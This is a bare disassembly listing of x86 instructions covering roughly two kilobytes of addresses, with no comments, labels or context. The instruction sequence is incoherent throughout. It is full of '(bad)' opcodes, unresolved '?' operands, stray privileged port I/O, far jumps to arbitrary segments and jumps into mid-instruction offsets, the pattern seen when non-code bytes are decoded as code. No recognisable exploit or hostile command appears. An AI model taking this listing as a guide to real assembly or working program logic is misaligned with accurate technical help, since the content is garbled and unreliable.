  42fd50:	lods   eax,DWORD PTR ds:[esi]
  42fd51:	sub    ebp,DWORD PTR [ebx-0x418b5245]
  42fd57:	lods   al,BYTE PTR ds:[esi]
  42fd58:	add    DWORD PTR [ebx],ebx
  42fd5a:	call   0xcf38ddb1
  42fd5f:	xchg   DWORD PTR [edi+0x68],esi
  42fd62:	nop
  42fd63:	in     eax,dx
  42fd64:	and    BYTE PTR [edx+0x13],ah
  42fd67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fd68:	xor    BYTE PTR [ebp-0x4e],ah
  42fd6b:	cwde   
  42fd6c:	cmp    edi,DWORD PTR [eax-0xeef293]
  42fd72:	dec    esp
  42fd73:	xchg   edx,eax
  42fd74:	inc    esp
  42fd75:	mov    dh,0xb2
  42fd77:	mov    al,0x4
  42fd79:	ins    DWORD PTR es:[edi],dx
  42fd7a:	cmp    esp,DWORD PTR [edx]
  42fd7c:	adc    eax,0xc01de04b
  42fd81:	mov    ebx,0x45756db1
  42fd86:	inc    edx
  42fd87:	lods   al,BYTE PTR ds:[esi]
  42fd88:	mov    ecx,0x5cb794bf
  42fd8d:	inc    ebx
  42fd8e:	loopne 0x42fd61
  42fd90:	jle    0x42fdbe
  42fd92:	push   ebp
  42fd93:	inc    edi
  42fd94:	popf   
  42fd95:	lock xor al,0x99
  42fd98:	jecxz  0x42fe10
  42fd9a:	push   eax
  42fd9b:	jne    0x42fe10
  42fd9d:	in     al,0xda
  42fd9f:	test   BYTE PTR ds:0x6d4c77fb,0xb
  42fda6:	rcl    esi,0x9e
  42fda9:	mov    edi,0x8f7e9211
  42fdae:	arpl   WORD PTR [ebp-0x76],bp
  42fdb1:	ss adc al,0xef
  42fdb4:	test   DWORD PTR [edx],ecx
  42fdb6:	loopne 0x42fd69
  42fdb8:	inc    edx
  42fdb9:	push   ss
  42fdba:	outs   dx,BYTE PTR ds:[esi]
  42fdbb:	xchg   ebp,eax
  42fdbc:	test   al,0x23
  42fdbe:	cmp    al,0x64
  42fdc0:	mov    edi,DWORD PTR [edx+eiz*1]
  42fdc3:	mov    esi,0x1a2295c
  42fdc8:	inc    esi
  42fdc9:	pop    ecx
  42fdca:	mov    bh,0x47
  42fdcc:	mov    al,0xfc
  42fdce:	dec    ebx
  42fdcf:	xchg   edi,eax
  42fdd0:	fisubr DWORD PTR [eax]
  42fdd2:	and    ecx,DWORD PTR [edi+0x49ba0018]
  42fdd8:	add    BYTE PTR [eax+edx*2+0x73],bh
  42fddc:	mov    eax,0x2a01d8d1
  42fde1:	nop
  42fde2:	out    0xd5,al
  42fde4:	cmp    DWORD PTR [esp+eax*8-0x7713ffe3],0x6e630df4
  42fdef:	cmp    ebp,DWORD PTR [eax]
  42fdf1:	adc    al,0x6c
  42fdf3:	lods   eax,DWORD PTR ds:[esi]
  42fdf4:	mov    ?,WORD PTR [edx]
  42fdf6:	dec    BYTE PTR [ecx+ebx*1+0x36]
  42fdfa:	inc    eax
  42fdfb:	jno    0x42fdd8
  42fdfd:	xchg   ebx,eax
  42fdfe:	pop    ds
  42fdff:	out    0xf2,al
  42fe01:	fild   DWORD PTR [ebx]
  42fe03:	sbb    eax,0xd2d00a4a
  42fe08:	(bad)  
  42fe09:	fwait
  42fe0a:	shl    esp,1
  42fe0c:	sbb    eax,0x75b89b57
  42fe11:	push   esp
  42fe12:	fnstsw WORD PTR [ebx]
  42fe14:	inc    eax
  42fe15:	or     dh,BYTE PTR [esi]
  42fe17:	jg     0x42fe2d
  42fe19:	in     al,dx
  42fe1a:	mul    DWORD PTR [ebx+0x7bd882ed]
  42fe20:	retf   0x256c
  42fe23:	xor    eax,DWORD PTR [ebx-0x24aa29a9]
  42fe29:	ins    DWORD PTR es:[edi],dx
  42fe2a:	or     DWORD PTR [edx-0x48],ecx
  42fe2d:	xchg   esp,eax
  42fe2e:	sub    al,0x8e
  42fe30:	xor    DWORD PTR [ecx+ecx*4-0x56],esi
  42fe34:	ss and bh,al
  42fe37:	mov    ebx,DWORD PTR [esi]
  42fe39:	dec    edi
  42fe3a:	dec    ebp
  42fe3b:	add    eax,0xc9a68dd0
  42fe40:	mov    ebx,0x6035ea5d
  42fe45:	add    DWORD PTR [edx-0x2c],0x5413a0bc
  42fe4c:	lahf   
  42fe4d:	mov    al,0xb5
  42fe4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fe50:	sub    eax,0x3f62a587
  42fe55:	das    
  42fe56:	es and eax,edx
  42fe59:	inc    ecx
  42fe5a:	fisttp QWORD PTR [edx]
  42fe5c:	pop    ds
  42fe5d:	stos   BYTE PTR es:[edi],al
  42fe5e:	icebp  
  42fe5f:	into   
  42fe60:	pop    ss
  42fe61:	push   0x24ab76b7
  42fe66:	push   esi
  42fe67:	stc    
  42fe68:	imul   ebx,edx,0x7b
  42fe6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fe6c:	xchg   edx,eax
  42fe6d:	sub    dh,BYTE PTR [esi+0x57aaa36d]
  42fe73:	add    BYTE PTR [edx-0x3be21f2c],0x85
  42fe7a:	mov    es,WORD PTR [eax+esi*1+0x70]
  42fe7e:	push   ebx
  42fe7f:	sbb    eax,0x5b633e63
  42fe84:	outs   dx,BYTE PTR ds:[esi]
  42fe85:	mov    ch,0x1c
  42fe87:	and    ebx,esp
  42fe89:	sub    cl,BYTE PTR [edi]
  42fe8b:	adc    esi,ecx
  42fe8d:	inc    ecx
  42fe8e:	test   dl,dh
  42fe90:	fild   DWORD PTR [edx]
  42fe92:	aam    0xc3
  42fe94:	mov    ebp,0xbd2329
  42fe99:	loopne 0x42fe44
  42fe9b:	and    eax,esp
  42fe9d:	push   esi
  42fe9e:	adc    BYTE PTR [esi],0x5
  42fea1:	mov    bl,0x95
  42fea3:	(bad)  
  42fea4:	fadd   DWORD PTR [ebp-0x2b]
  42fea7:	mov    dh,0x90
  42fea9:	clc    
  42feaa:	add    eax,0xe10730b1
  42feaf:	aam    0xd4
  42feb1:	(bad)  
  42feb2:	(bad)  
  42feb3:	test   BYTE PTR [ebx+eiz*2-0x5b],0xb7
  42feb8:	sub    cl,BYTE PTR [esi+0x1536d883]
  42febe:	stc    
  42febf:	mov    edx,0x75e05f9e
  42fec4:	inc    esi
  42fec5:	xor    eax,0x9405b010
  42feca:	popf   
  42fecb:	mov    esp,0xc005d85d
  42fed0:	lods   eax,DWORD PTR ds:[esi]
  42fed1:	fs jbe 0x42ff2b
  42fed4:	or     al,0xd9
  42fed6:	enter  0xdad8,0xe
  42feda:	cmp    BYTE PTR [esi+eiz*4-0x13228efc],0x6e
  42fee2:	or     eax,0xfdc45d01
  42fee7:	fsubr  st,st(0)
  42fee9:	jo     0x42fec8
  42feeb:	mov    ch,0xe0
  42feed:	xchg   BYTE PTR [edx+0x20748a2f],cl
  42fef3:	push   edi
  42fef4:	push   eax
  42fef5:	shl    DWORD PTR [ebp+0x4a0b93a5],1
  42fefb:	stos   BYTE PTR es:[edi],al
  42fefc:	or     eax,0x6b74016
  42ff01:	sar    DWORD PTR ds:0x700b54b5,1
  42ff07:	push   es
  42ff08:	sub    BYTE PTR [esi-0x4c],ch
  42ff0b:	ror    BYTE PTR [eax],1
  42ff0d:	mov    ds:0xf3bb37d3,al
  42ff12:	push   cs
  42ff13:	stos   DWORD PTR es:[edi],eax
  42ff14:	stos   BYTE PTR es:[edi],al
  42ff15:	mov    ?,WORD PTR [edx]
  42ff17:	shr    bh,cl
  42ff19:	jmp    0x42feef
  42ff1b:	adc    al,0x88
  42ff1d:	ins    DWORD PTR es:[edi],dx
  42ff1e:	inc    edi
  42ff1f:	mov    cl,0xc
  42ff21:	adc    ecx,DWORD PTR [edi+0x799887e7]
  42ff27:	mov    dh,0x85
  42ff29:	lods   eax,DWORD PTR ds:[esi]
  42ff2a:	stos   DWORD PTR es:[edi],eax
  42ff2b:	sar    DWORD PTR [edx+0x41],cl
  42ff2e:	mov    bl,0x10
  42ff30:	mov    bh,dl
  42ff32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ff33:	call   0xc01d827e
  42ff38:	repnz pop ss
  42ff3a:	fcomp  DWORD PTR [eax-0x64]
  42ff3d:	jbe    0x42ff03
  42ff3f:	mov    dh,0x29
  42ff41:	ds pop eax
  42ff43:	pop    eax
  42ff44:	lods   eax,DWORD PTR ds:[esi]
  42ff45:	test   eax,0x5b8ccfa4
  42ff4a:	or     ebx,DWORD PTR [ebx-0x25]
  42ff4d:	dec    ebp
  42ff4e:	inc    edx
  42ff4f:	cwde   
  42ff50:	inc    ecx
  42ff51:	fsubr  DWORD PTR [ebx]
  42ff53:	imul   ebx,esp,0x2f
  42ff56:	sub    bl,dl
  42ff58:	outs   dx,BYTE PTR ds:[esi]
  42ff59:	dec    ebx
  42ff5a:	jmp    0x9002198c
  42ff5f:	dec    ebp
  42ff60:	jmp    0x1bb00372
  42ff65:	mov    ebx,0xd0b6c26f
  42ff6a:	jmp    0xd782:0xa3a16bae
  42ff71:	int    0x80
  42ff73:	pop    es
  42ff74:	dec    esi
  42ff75:	scas   eax,DWORD PTR es:[edi]
  42ff76:	or     ecx,DWORD PTR ds:0x1e5176d0
  42ff7c:	sti    
  42ff7d:	fisttp QWORD PTR [bx+si+0x6d]
  42ff81:	out    0xb0,al
  42ff83:	ins    DWORD PTR es:[edi],dx
  42ff84:	ins    BYTE PTR es:[edi],dx
  42ff85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ff86:	out    0x9b,eax
  42ff88:	push   0xbc4f1b91
  42ff8d:	inc    esi
  42ff8e:	fstp   QWORD PTR [edx]
  42ff90:	test   al,0xba
  42ff92:	div    DWORD PTR [ebx]
  42ff94:	stc    
  42ff95:	lahf   
  42ff96:	push   cs
  42ff97:	mov    bl,0x8c
  42ff99:	scas   eax,DWORD PTR es:[edi]
  42ff9a:	ss inc eax
  42ff9c:	les    ebp,FWORD PTR [ebp-0x643904aa]
  42ffa2:	ret    0x2479
  42ffa5:	push   ebx
  42ffa6:	ror    BYTE PTR [esi],0x88
  42ffa9:	jnp    0x42ffd3
  42ffab:	push   ebp
  42ffac:	push   edx
  42ffad:	or     DWORD PTR [eax-0x3ca7b935],esp
  42ffb3:	pusha  
  42ffb4:	push   ss
  42ffb5:	or     al,BYTE PTR [ebp+0x16]
  42ffb8:	jne    0x42ffba
  42ffba:	mov    ch,0xb2
  42ffbc:	cmp    ch,BYTE PTR [ebx-0x69]
  42ffbf:	jge    0x430021
  42ffc1:	pop    ebx
  42ffc2:	mov    ds:0xb19114c2,al
  42ffc7:	mov    al,0xd1
  42ffc9:	sub    al,0x35
  42ffcb:	add    dh,BYTE PTR [esi-0x764c3452]
  42ffd1:	vsubss xmm3,xmm7,DWORD PTR [eax+0x68]
  42ffd6:	add    eax,0xdc19797
  42ffdb:	jle    0x430012
  42ffdd:	jmp    0x78831728
  42ffe2:	and    al,0x96
  42ffe4:	pop    es
  42ffe5:	jl     0x430007
  42ffe7:	push   es
  42ffe8:	loop   0x42ffb0
  42ffea:	inc    edx
  42ffeb:	pop    ebx
  42ffec:	fwait
  42ffed:	daa    
  42ffee:	ja     0x43000c
  42fff0:	hlt    
  42fff1:	or     BYTE PTR [edx+0x17],ah
  42fff4:	ror    BYTE PTR [ebx+0x32],1
  42fff7:	or     BYTE PTR [ecx],dl
  42fff9:	(bad)  
  42fffa:	or     bl,dl
  42fffc:	mov    BYTE PTR [edx-0x6663b64a],bl
  430002:	test   eax,0x34edaba0
  430007:	push   ds
  430008:	ins    DWORD PTR es:[edi],dx
  430009:	inc    ecx
  43000a:	out    dx,al
  43000b:	fst    QWORD PTR ds:0xafb685c1
  430012:	(bad)  
  430013:	stos   BYTE PTR es:[edi],al
  430014:	pop    es
  430015:	sbb    BYTE PTR [ecx-0x277f793f],dl
  43001b:	jns    0x42fff7
  43001d:	mov    ds:0x64eb017,eax
  430022:	add    dh,BYTE PTR [esi]
  430024:	inc    eax
  430025:	scas   eax,DWORD PTR es:[edi]
  430026:	ins    DWORD PTR es:[edi],dx
  430027:	sar    DWORD PTR [esi-0x2af292d2],0xd8
  43002e:	pop    ss
  43002f:	jno    0x430085
  430031:	xor    eax,0x3be111c8
  430036:	fild   DWORD PTR [edx]
  430038:	pusha  
  430039:	mov    al,ds:0x114c4ed2
  43003e:	push   es
  43003f:	jbe    0x430092
  430041:	jne    0x42fff7
  430043:	mov    ebp,0xb65b84bf
  430048:	mov    eax,0xc2d40058
  43004d:	(bad)  
  43004e:	inc    esp
  43004f:	mov    DWORD PTR [edx+esi*8],ebp
  430052:	call   0xb0ec6e31
  430057:	in     eax,dx
  430058:	div    BYTE PTR [ebx+0x6e]
  43005b:	xchg   edx,eax
  43005c:	push   eax
  43005d:	xor    BYTE PTR [esi-0x77],al
  430060:	jbe    0x4300cd
  430062:	pop    ebx
  430063:	fdiv   DWORD PTR [eax+ebx*1+0x49]
  430067:	sub    eax,edi
  430069:	out    dx,eax
  43006a:	mov    esi,0xdb7a12c2
  43006f:	mov    dh,0x80
  430071:	fiadd  DWORD PTR [edx]
  430073:	mov    eax,ds:0x453b920
  430078:	bound  ebp,QWORD PTR [ebp+0x446a21ad]
  43007e:	add    BYTE PTR [esi-0x2c],dl
  430081:	popf   
  430082:	jg     0x43005a
  430084:	outs   dx,BYTE PTR ds:[esi]
  430085:	or     eax,0x56587bd5
  43008a:	sar    DWORD PTR [edx+0x42],0x81
  43008e:	sbb    al,BYTE PTR [esi-0x1f824a4c]
  430094:	and    DWORD PTR [ebx-0x7],ebp
  430097:	xor    bl,dh
  430099:	jge    0x430046
  43009b:	dec    esp
  43009c:	out    0xda,eax
  43009e:	pcmpeqd mm0,QWORD PTR [eax]
  4300a1:	mov    ch,0xfc
  4300a3:	sub    ecx,ebx
  4300a5:	pop    eax
  4300a6:	fisttp WORD PTR [eax]
  4300a8:	ficom  DWORD PTR [ecx+0x5]
  4300ab:	pop    ss
  4300ac:	and    ch,BYTE PTR [edx+edi*8-0x58]
  4300b0:	gs jno 0x430035
  4300b3:	ins    DWORD PTR es:[edi],dx
  4300b4:	test   eax,0x8f198481
  4300b9:	aam    0x53
  4300bb:	sbb    ah,BYTE PTR [bp+si]
  4300be:	mov    eax,0x9a4dc995
  4300c3:	gs loop 0x43010f
  4300c6:	lods   eax,DWORD PTR ds:[esi]
  4300c7:	scas   eax,DWORD PTR es:[edi]
  4300c8:	mov    ds:0xba62a7d0,al
  4300cd:	inc    ebp
  4300ce:	mov    eax,0xb6afc7c2
  4300d3:	mov    dl,0x26
  4300d5:	clc    
  4300d6:	je     0x430099
  4300d8:	data16 lahf 
  4300da:	jp     0x430070
  4300dc:	push   eax
  4300dd:	mov    ch,0xd5
  4300df:	ror    ecx,0x74
  4300e2:	sub    ah,BYTE PTR [esi+0x2e85a8f]
  4300e8:	fisub  DWORD PTR [eax-0x6e8edbbc]
  4300ee:	mov    eax,0xe6edb605
  4300f3:	pop    edx
  4300f4:	sub    al,0x39
  4300f6:	dec    ecx
  4300f7:	or     ch,0x15
  4300fa:	fimul  DWORD PTR [ecx+eiz*4]
  4300fd:	add    al,ah
  4300ff:	add    eax,0x6870bf0a
  430104:	bound  ecx,QWORD PTR ds:0xede672d2
  43010a:	mov    dh,0x35
  43010c:	adc    eax,0x2d1d2a0
  430111:	inc    esp
  430112:	add    DWORD PTR [ecx+ebp*1-0x7ae45793],esp
  430119:	add    DWORD PTR [ebp+0x312accdb],esi
  43011f:	jecxz  0x430174
  430121:	push   ebp
  430122:	xor    al,0x40
  430124:	mov    ah,0x1a
  430126:	out    dx,al
  430127:	push   ebp
  430128:	jmp    0x4775:0xa96dd05d
  43012f:	out    dx,al
  430130:	aam    0x42
  430132:	sub    esi,DWORD PTR [eax+0x29b50dc7]
  430138:	mov    ch,BYTE PTR [esi]
  43013a:	call   FWORD PTR [edi+0x5fd47386]
  430140:	fsubr  DWORD PTR [esi+0x5b]
  430143:	shr    BYTE PTR [ebp-0x3daf0153],1
  430149:	cs mov ebx,0xbfeb0057
  43014f:	mov    ds:0x2f2a58dd,eax
  430154:	in     al,0xe7
  430156:	inc    ecx
  430157:	dec    ebp
  430158:	sub    dl,0x6e
  43015b:	or     ebx,DWORD PTR ds:0xf9422a75
  430161:	imul   esp,DWORD PTR [eax+0x384a5caa],0x4
  430168:	mov    ch,0xab
  43016a:	or     BYTE PTR [esi+0x1c],dl
  43016d:	call   FWORD PTR [ebp+0x68]
  430170:	or     BYTE PTR [esi+0x46],dh
  430173:	mov    edx,0x555632d0
  430178:	adc    DWORD PTR ds:0xa36dc051,ebx
  43017e:	sbb    BYTE PTR [eax],0xbd
  430181:	cmp    DWORD PTR ds:0xa6adbfd,0x36
  430188:	lods   eax,DWORD PTR ds:[esi]
  430189:	pop    ebx
  43018a:	cmp    ebx,DWORD PTR [eax]
  43018c:	fdivrp st(7),st
  43018e:	lods   al,BYTE PTR ds:[esi]
  43018f:	out    0xea,al
  430191:	add    BYTE PTR ds:0x1999836a,0xb2
  430198:	lods   al,BYTE PTR ds:[esi]
  430199:	pop    ebp
  43019a:	push   0x11
  43019c:	cdq    
  43019d:	imul   esp,DWORD PTR [edi],0x22c97941
  4301a3:	outs   dx,BYTE PTR ds:[esi]
  4301a4:	je     0x4301e6
  4301a6:	(bad)  
  4301a7:	mov    dh,0xe4
  4301a9:	daa    
  4301aa:	out    0xda,eax
  4301ac:	inc    ebp
  4301ad:	mov    bh,0xe
  4301af:	test   DWORD PTR ds:0xe9dd6795,eax
  4301b5:	(bad)  
  4301b6:	pop    esp
  4301b7:	ss adc ebp,ebp
  4301ba:	and    bh,BYTE PTR [ecx]
  4301bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4301bd:	push   ss
  4301be:	mov    BYTE PTR [edi+ecx*1],bl
  4301c1:	mov    edx,0xbdb41b0
  4301c6:	jl     0x4301c6
  4301c8:	adc    al,0x55
  4301ca:	cli    
  4301cb:	in     eax,dx
  4301cc:	out    0xc2,al
  4301ce:	inc    edi
  4301cf:	fwait
  4301d0:	or     al,BYTE PTR [ecx+0x409a92ac]
  4301d6:	or     eax,0xc6d2e346
  4301db:	adc    al,0xfc
  4301dd:	jbe    0x4301ed
  4301df:	xchg   edi,eax
  4301e0:	fdivr  QWORD PTR [edi]
  4301e2:	imul   BYTE PTR [ebp-0x7717e523]
  4301e8:	push   ss
  4301e9:	add    eax,0x95456803
  4301ee:	and    BYTE PTR [edx],bl
  4301f0:	rol    BYTE PTR ds:0xadaca5c1,1
  4301f6:	popf   
  4301f7:	test   al,0x53
  4301f9:	cdq    
  4301fa:	arpl   WORD PTR [ebx-0x49],bp
  4301fd:	push   esi
  4301fe:	or     dh,cl
  430200:	or     al,0x1a
  430202:	es sub ecx,DWORD PTR ds:[ebx+ecx*1]
  430207:	ss mov dh,0x6d
  43020a:	je     0x430268
  43020c:	push   edi
  43020d:	push   eax
  43020e:	jge    0x4301e2
  430210:	ret    
  430211:	pop    es
  430212:	pop    ebx
  430213:	pop    es
  430214:	vpsubw ymm4,ymm2,ymm6
  430218:	lock pop edx
  43021a:	jle    0x4301b5
  43021c:	ja     0x430290
  43021e:	stos   BYTE PTR es:[edi],al
  43021f:	es stos BYTE PTR es:[edi],al
  430221:	mov    dh,0x8b
  430223:	xchg   ebp,eax
  430224:	cs or  eax,0x6ea3ab56
  43022a:	xor    al,0x79
  43022c:	jle    0x430296
  43022e:	(bad)  
  430230:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430231:	call   0xe18:0x6d8dad8d
  430238:	dec    edi
  430239:	test   al,0x64
  43023b:	push   0xfffffff6
  43023d:	imul   ecx,DWORD PTR [ebx],0xc98095b8
  430243:	dec    ecx
  430244:	pop    ecx
  430245:	jge    0x4301ce
  430247:	outs   dx,DWORD PTR ds:[esi]
  430248:	push   ebp
  430249:	pop    ebx
  43024a:	mov    eax,ds:0xd4dc5daa
  43024f:	pop    esi
  430250:	ins    DWORD PTR es:[edi],dx
  430251:	pop    ebx
  430252:	pop    edx
  430253:	push   0x8cf864e9
  430258:	or     bl,BYTE PTR [ecx+0x18]
  43025b:	push   ebx
  43025c:	and    BYTE PTR [esi],bh
  43025e:	dec    DWORD PTR [ebp+0x4c02a23a]
  430264:	add    BYTE PTR [esp+ebp*8+0x0],ch
  430268:	(bad)  
  43026a:	int3   
  43026b:	jle    0x43028a
  43026d:	add    al,0x71
  43026f:	jmp    0x4302dd
  430271:	cmp    BYTE PTR [esi],0x18
  430274:	and    bh,BYTE PTR [ebp-0x7d717ae1]
  43027a:	mov    dh,0x4f
  43027c:	aam    0xbc
  43027e:	adc    BYTE PTR [edx+0x1104d87c],0xb7
  430285:	and    BYTE PTR [edx-0x7242d9ea],dl
  43028b:	test   al,0x11
  43028d:	shr    BYTE PTR [ebp+0xe7340a9],0x7a
  430294:	into   
  430295:	fstp   TBYTE PTR [eax+0x1d0936d5]
  43029b:	sbb    esp,DWORD PTR [eax+ecx*4+0x2d87cd0f]
  4302a2:	repnz sub eax,0xac600e15
  4302a8:	xor    eax,0x68d5540
  4302ad:	mov    ds:0x9f25ab4b,al
  4302b2:	push   es
  4302b3:	fisub  DWORD PTR [ebp-0x3aaf293e]
  4302b9:	imul   edi,DWORD PTR [edi-0x37],0xffffffc1
  4302bd:	mov    al,0x62
  4302bf:	mov    gs,WORD PTR ds:0x8ec2d42c
  4302c5:	fldcw  WORD PTR [esi]
  4302c7:	push   ss
  4302c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4302c9:	dec    esp
  4302ca:	outs   dx,BYTE PTR ds:[esi]
  4302cb:	bound  edi,QWORD PTR [ebx+0x649c4435]
  4302d1:	pop    edi
  4302d2:	sar    BYTE PTR [esi+0x5d6ed48c],cl
  4302d8:	push   eax
  4302d9:	mov    ebx,0xf7d8e7ff
  4302de:	jl     0x4302c3
  4302e0:	imul   esp,DWORD PTR [esi+0x202baddf],0xcf26fbd1
  4302ea:	cwde   
  4302eb:	loopne 0x4302c5
  4302ed:	inc    edi
  4302ee:	adc    eax,0xce42404b
  4302f3:	cwde   
  4302f4:	push   ebp
  4302f5:	and    BYTE PTR [ebx-0x79467c9e],0x9a
  4302fc:	mov    ds:0xd79cb4ba,al
  430301:	dec    ebp
  430302:	mov    dh,BYTE PTR [esi]
  430304:	sub    al,0x42
  430306:	pop    eax
  430307:	pop    eax
  430308:	sub    bl,ah
  43030a:	cwde   
  43030b:	in     al,0x6f
  43030d:	(bad)  
  43030e:	enter  0x31fe,0x35
  430312:	and    eax,0xf9dc430a
  430317:	cmp    DWORD PTR [edi-0x7],edx
  43031a:	inc    esp
  43031b:	test   al,0x7
  43031d:	aaa    
  43031e:	mov    dh,0x1b
  430320:	xchg   BYTE PTR [ecx+0x5f49ca9c],dl
  430326:	xchg   esi,eax
  430327:	fnsave ds:[esi-0x5e8bb031]
  43032e:	ins    BYTE PTR es:[edi],dx
  43032f:	xor    dh,BYTE PTR [ebp+0x55b38f70]
  430335:	mov    bh,0x26
  430337:	fdivr  DWORD PTR [edx+0x3a]
  43033a:	sub    DWORD PTR [ebp-0x3b],esp
  43033d:	addr16 mov edi,0x536d880b
  430343:	data16 outs dx,BYTE PTR ds:[esi]
  430345:	and    BYTE PTR [esi],0xbd
  430348:	push   ss
  430349:	mov    al,ds:0x46adadb6
  43034e:	fld    QWORD PTR [edi]
  430350:	idiv   DWORD PTR [edi+0x11]
  430353:	add    ebp,DWORD PTR [eax+0x1cb40b96]
  430359:	push   ecx
  43035a:	or     eax,0x42b7373e
  43035f:	mov    bh,0x26
  430361:	xor    BYTE PTR [edx+ebx*1-0x10e56cd2],bl
  430368:	ret    
  430369:	fstp   DWORD PTR [ebp+0x45]
  43036c:	pop    esp
  43036d:	push   0x45563a26
  430372:	addr16 enter 0x6b70,0x82
  430377:	mov    BYTE PTR [esi-0x3279788b],bl
  43037d:	into   
  43037e:	test   eax,0x1410d80
  430383:	mov    al,ds:0x36d58bc7
  430388:	adc    eax,0x3abb76b5
  43038d:	mov    dl,0x99
  43038f:	(bad)  
  430390:	rol    BYTE PTR [edx],1
  430392:	push   ebp
  430393:	mov    ebx,0xc51bb776
  430398:	push   cs
  430399:	xchg   edx,eax
  43039a:	or     DWORD PTR [edx],ecx
  43039c:	shl    BYTE PTR [esi],1
  43039e:	repnz cmp bh,BYTE PTR [edi+eax*2-0x66]
  4303a3:	pop    edi
  4303a4:	mov    cl,0x29
  4303a6:	mov    bl,BYTE PTR [ebx-0x32]
  4303a9:	push   ebx
  4303aa:	nop
  4303ab:	mov    bh,0x3e
  4303ad:	dec    edx
  4303ae:	sub    eax,ebp
  4303b0:	inc    edx
  4303b1:	pop    es
  4303b2:	cdq    
  4303b3:	pop    es
  4303b4:	sbb    al,0x8
  4303b6:	pop    edi
  4303b7:	sbb    BYTE PTR ds:0xc07cb005,0x87
  4303bf:	rcl    DWORD PTR [eax+0x2ba85d2d],0x55
  4303c6:	xchg   ebx,eax
  4303c7:	mov    eax,ds:0x7defa0a3
  4303cc:	and    BYTE PTR [esi],dh
  4303ce:	push   ebp
  4303cf:	mov    ah,0x62
  4303d1:	xchg   BYTE PTR [eax-0x749e2e35],al
  4303d7:	mov    dh,0xb
  4303d9:	stc    
  4303da:	cdq    
  4303db:	loop   0x430372
  4303dd:	jne    0x430445
  4303df:	inc    ebx
  4303e0:	cs xor al,0x44
  4303e3:	jo     0x43045e
  4303e5:	xor    eax,0x904cafd
  4303ea:	push   es
  4303eb:	mov    edx,ebx
  4303ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4303ee:	and    dl,cl
  4303f0:	jl     0x4303e5
  4303f2:	and    BYTE PTR [esi],al
  4303f4:	mov    BYTE PTR [ebp+0x2e076165],al
  4303fa:	jmp    0xc45d:0xa0ae4675
  430401:	push   es
  430402:	push   ecx
  430403:	ins    DWORD PTR es:[edi],dx
  430404:	call   0x4047:0x6a76790d
  43040b:	ins    BYTE PTR es:[edi],dx
  43040c:	dec    ebp
  43040d:	and    edx,eax
  43040f:	pop    ds
  430410:	fs jmp 0x83f81776
  430416:	not    DWORD PTR [ecx-0x1c6fc2c5]
  43041c:	mov    ch,0x6d
  43041e:	or     esp,DWORD PTR ds:0x2079d906
  430424:	(bad)  
  430425:	cmp    eax,DWORD PTR [ecx]
  430427:	stos   BYTE PTR es:[edi],al
  430428:	pusha  
  430429:	popa   
  43042a:	inc    edi
  43042b:	dec    ecx
  43042c:	dec    esp
  43042d:	adc    DWORD PTR [ecx],esi
  43042f:	inc    ecx
  430430:	xor    al,0x54
  430432:	jo     0x43041f
  430434:	xor    DWORD PTR gs:[eax],esp
  430437:	ins    DWORD PTR es:[edi],dx
  430438:	and    cl,BYTE PTR [edi-0x2939248a]
  43043e:	outs   dx,BYTE PTR ds:[esi]
  43043f:	xchg   esi,eax
  430440:	xor    eax,0xf41d8665
  430445:	stos   DWORD PTR es:[edi],eax
  430446:	stc    
  430447:	adc    al,0xb0
  430449:	fmul   DWORD PTR [eax]
  43044b:	sbb    ch,BYTE PTR [eax+0x1352876d]
  430451:	daa    
  430452:	pop    ebp
  430453:	push   esp
  430454:	ins    BYTE PTR es:[edi],dx
  430455:	and    bh,ah
  430457:	lods   eax,DWORD PTR ds:[esi]
  430458:	cs addr16 xchg dl,dh
  43045c:	shr    BYTE PTR [esi],cl
  43045e:	mov    al,ds:0x5ac614cf
  430463:	push   eax
  430464:	push   ss
  430465:	add    dh,bl
  430467:	jbe    0x43044c
  430469:	mov    ebp,ebp
  43046b:	mov    bl,0x17
  43046d:	dec    ebp
  43046e:	rcr    BYTE PTR [ebx-0x4f],cl
  430471:	pusha  
  430472:	xchg   edx,eax
  430473:	or     BYTE PTR [edi-0x48e5c8fc],cl
  430479:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43047a:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  43047c:	cmp    al,0x6f
  43047e:	mov    ds:0xd1c02565,al
  430483:	add    al,0x75
  430485:	dec    esi
  430486:	(bad)  
  430487:	xor    al,0xd6
  430489:	push   es
  43048a:	pusha  
  43048b:	mov    al,ds:0x1c5d176
  430490:	xor    DWORD PTR [eax+0x6b],esi
  430493:	and    al,0x89
  430496:	cmp    ch,dl
  430498:	into   
  430499:	pop    ecx
  43049a:	js     0x43043f
  43049c:	and    BYTE PTR [esi],ch
  43049e:	je     0x4304a0
  4304a0:	adc    DWORD PTR [ebp+0x42a3464f],esp
  4304a6:	inc    ebx
  4304a7:	add    DWORD PTR [ecx+ecx*2+0x5],ebp
  4304ab:	fimul  DWORD PTR [esi+0x3704]
  4304b1:	sbb    eax,ecx
  4304b3:	jne    0x4304d1
  4304b5:	cmp    BYTE PTR [ebx+eiz*4+0x3ba3d0b8],al
  4304bc:	pop    esi
  4304bd:	fdiv   st,st(0)
  4304bf:	inc    ecx
  4304c0:	ss inc ebx
  4304c2:	sbb    ecx,DWORD PTR [ebx+0x14]
  4304c5:	cmc    
  4304c6:	js     0x430502
  4304c8:	jecxz  0x4304ed
  4304ca:	cld    
  4304cb:	pop    esp
  4304cc:	fcomp  st(0)
  4304ce:	fdiv   DWORD PTR [ecx+0x1c]
  4304d1:	(bad)  
  4304d2:	cmp    al,0x63
  4304d4:	or     BYTE PTR [ebp+ebx*4+0x49],cl
  4304d8:	sub    BYTE PTR [ebp+0x3],0x40
  4304dc:	adc    cl,BYTE PTR [ebp-0x12]
  4304df:	push   ebx
  4304e0:	stc    
  4304e1:	mov    dh,0x56
  4304e3:	push   0x22
  4304e5:	std    
  4304e6:	(bad)  
  4304e7:	mov    DWORD PTR [ebx],ebp
  4304e9:	pop    ss
  4304ea:	mov    eax,ds:0xd6ea8868
